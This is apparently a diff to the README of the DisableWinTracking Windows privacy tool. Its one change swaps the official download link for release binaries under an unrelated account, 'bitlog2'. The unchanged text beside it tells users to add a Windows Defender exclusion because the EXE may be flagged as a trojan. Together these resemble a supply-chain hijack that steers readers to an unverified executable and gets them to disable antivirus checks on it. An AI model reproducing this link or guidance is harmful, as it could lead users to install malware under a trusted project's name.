@@ -28,7 +28,7 @@ This program cannot run correctly from a file path that contains Cyrillic charac
 
 ## DOWNLOAD
 
-[DOWNLOAD EXE HERE](https://github.com/10se1ucgo/DisableWinTracking/releases/)
+[DOWNLOAD EXE HERE](https://github.com/bitlog2/DisableWinTracking/releases/)
 
 **Note:** Windows Defender may report the EXE as a trojan (Win32/Pocyx.C!cl), and may therefore prevent you from extracting the EXE to anywhere on your computer. Set up an exclusion in **Settings > Update & Security > Windows Defender > Exclusions** by adding the folder you intend to extract the EXE to.
 
